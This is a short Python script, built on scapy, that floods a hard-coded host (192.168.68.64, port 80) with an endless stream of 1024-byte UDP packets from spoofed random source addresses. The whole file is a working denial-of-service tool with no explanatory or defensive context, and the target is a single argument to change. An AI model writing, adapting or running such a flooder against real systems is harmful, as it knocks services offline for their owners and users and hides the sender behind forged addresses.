from scapy.all import *

def flood(target_ip, target_port):
    ip = IP(src=RandIP("192.168.68.1/24"), dst=target_ip)
    udp = UDP(sport=RandShort(), dport=target_port)
    raw = Raw(b"X"*1024)

    packet = ip / udp / raw
    send(packet, loop=1, inter=0.01, verbose=0)


if __name__ == "__main__":
    flood("192.168.68.64", 80)